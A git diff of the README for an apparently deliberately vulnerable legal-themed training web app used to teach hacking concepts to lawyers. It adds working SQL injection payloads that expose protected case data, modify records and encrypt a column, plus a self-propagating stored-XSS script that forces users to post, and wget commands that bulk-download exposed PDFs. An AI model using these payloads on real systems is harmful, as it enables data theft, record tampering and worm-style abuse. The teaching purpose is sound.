@@ -11,17 +11,25 @@ docker-compose up -d
 ```
 There is a shell script in the app folder called create_sql.sh. This will drop the websitedata table if it exists and reinstall from a sql file in the mysql_tables folder in app.
 ```
-docker exec -it hacking4lawyers_webapp_1 bash
+docker exec -it hacking4lawyers-webapp-1 bash
 cd app_backend
 bash create_sql.sh 
 ```
 Create a new mysql user from commandline.
 ```
 mysql -u root -p
-CREATE USER 'matthew' IDENTIFIED BY 'password';
-GRANT ALL PRIVILEGES ON *.* TO 'matthew';
+CREATE USER 'my_user_name'@'%' IDENTIFIED BY 'password';
+GRANT ALL PRIVILEGES ON *.* TO 'my_user_name';
 FLUSH PRIVILEGES;
 ```
+
+Install SSL Cert
+```
+certbot --apache
+```
+Type in the names of your domain hacking4lawyers.com www.hacking4lawyers.com
+Click the second option to select the new ssl conf file and then click 2 to redirect to https.
+You may not want to redirect to https if you want to show how network traffic can be intercepted.
 
 # Topics Covered
 ## Case Search Page
@@ -33,6 +41,38 @@ You can use inspect on chrome to modify the value of the dropdown to be any numb
 
 ### Case Search SQL Injection Queries
 
+Updated SQL Queries
+
+Case Search to retrieve an expunged case.
+```
+12C934924' -- 
+```
+Last name search to retrieve all expunged cases.
+```
+John' or Expunged = True-- 
+```
+Reveal Judge's name or Plaintiff's Address in DV cases
+```
+fakecasenumber'
+UNION
+SELECT Case_Number,Case_Type,Plaintiff_Name,Plaintiff_Address,Defendant_Name,Defendant_Address,Hearing_Date,CONCAT('Plaintiffs Address: ',Plaintiff_Address) as Case_Description,Judge, Expunged
+FROM casedata WHERE Case_Number = '12C934902' -- 
+
+fakecasenumber'
+UNION
+SELECT Case_Number,Case_Type,Plaintiff_Name,Plaintiff_Address,Defendant_Name,Defendant_Address,Hearing_Date,CONCAT('Judge: ',Judge) as Case_Description,Judge, Expunged
+FROM casedata WHERE Case_Number = '12C934902' -- 
+```
+Update a single defendant's name
+```
+12C934911'; UPDATE casedata SET Defendant_Name = 'John Smith' WHERE Case_Number = '12C934911'-- 
+```
+Encrypt all data in a single column.
+```
+12C934911'; UPDATE casedata SET Defendant_Name = AES_ENCRYPT(Defendant_Name,'password') -- 
+```
+
+Old Queries
 ```
 Type this into the case number search box. It can also be typed into the url as a get parameter.
 Step 0: Check to see if SQL Injection works at all.
@@ -149,6 +189,27 @@ Note: This one should be dropped as an example because it then prohibits any of 
     </script>
 ```
 
+Makes every user post a blog post about how great Matthew Stubenberg is. This verison has a timer so we can see the post before it's clicked.
+```
+<script>
+$(document).ready(function() {
+	
+    var usernameFromP = $("#accountinfousername").text().trim();
+    if ($("." + usernameFromP).length == 0) {
+		console.log("User has not posted about me yet");
+        $("#blogpost").val("Matthew Stubenberg is one of the greatest attorneys out there." + `<span class="${usernameFromP}"></span>`);
+        $("#blogtitle").val("Matthew Stubenberg Best Attorney");
+        setTimeout(function(){
+			$("#submitpostbutton").click();
+		},10000);
+    } else {
+        console.log("User has already posted");
+    }
+	
+});
+</script>
+```
+
 ## Cracking Passwords 
 This is all on the pass_cracker folder.
 
@@ -173,6 +234,15 @@ If `hashcat` can find a word in `wordlist.txt` with a hash that matches one in `
 ## Classified Portal Page
 This one is located at /blog/classified_portal.php and is designed to demonstrate how Chelsea Manning used wget to login and download Classified PDFs.
 The page with all the documents is also left exposed if you go directly to the URL at https://hacking4lawyers.com/blog/classified_documents/.
+
+Download a single document
+```
+wget --post-data "username=testuser&password=password" http://localhost/blog/classified_documents/CLASSIFIED%20DOCUMENT%201.pdf
+```
+Download all documents
+```
+wget -r -nd -l1 -A "*.pdf" --post-data "username=testuser&password=password" http://localhost/blog/classified_portal.php
+```
 
 ## Article Paywall
 The article at https://hacking4lawyers.com/blog/article.php is set to throw up a login paywall after 3 seconds. You can bypass it by switching your user-agent to "Google Bot" or by usign javascript to disable the modal. Discussion should be around DMCA and whether our technique bypasses a technological measure and what the copyrighted material is.
